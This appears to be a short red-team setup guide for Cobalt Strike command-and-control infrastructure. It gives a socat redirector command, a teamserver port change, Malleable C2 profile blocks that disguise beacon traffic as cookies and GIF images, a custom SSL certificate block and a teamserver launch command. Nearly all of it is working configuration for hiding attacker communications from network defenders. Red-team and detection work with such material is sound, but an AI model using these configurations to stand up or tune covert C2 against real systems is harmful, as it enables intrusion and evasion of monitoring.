# C2 Infrastructure

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/C2Infrastructure/Screen1.png?raw=true)

## Setup Redirector
```
socat TCP4-LISTEN:80,fork TCP4:C2_Server_IP:80
```

## Setup C2 Server (Cobalt Strike)

### Change Default Port
```
sed 's/50050/22222/' teamserver > tmp; mv tmp teamserver
```

### C2 Profiles
```
https://github.com/rsmudge/Malleable-C2-Profiles
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/C2Infrastructure/Screen2.png?raw=true)

1- http-get -> client -> metadata
```
metadata {
	base64;
	prepend "skin=noskin;session-token=";
	append ";csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
	header "Cookie";
}
```

2- http-get -> server -> output
```
output {
	prepend "Hello world!";
	mask;
	print;
}
```

3- http-post -> client -> id
```
id {
	parameter "sn";
}
```

4- http-post -> client -> output
```
output {
	base64;
	print;
}
```

5- http-post -> server -> output
```
output {
	prepend "Hello World!";
	mask;
	print;
}
```

6- http-stager -> server -> output
```
header "Content-Type" "image/gif";
output {
	prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
	prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
	prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
	print;
}
```

7- New ssl certificate
```
https-certificate {
	set O  "dmcjna";
	set CN "dmcjna";
	set validity "365";
}
```

### Test New Profile
C2 Profile Full Example: [Link](https://github.com/hassan0x/RedTeam/blob/main/C2Infrastructure/example.profile)
```
./c2lint example.profile
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/C2Infrastructure/Screen3.png?raw=true)

### Run Cobalt
```
./teamserver 8.8.8.8 P@ssw0rd example.profile &
```
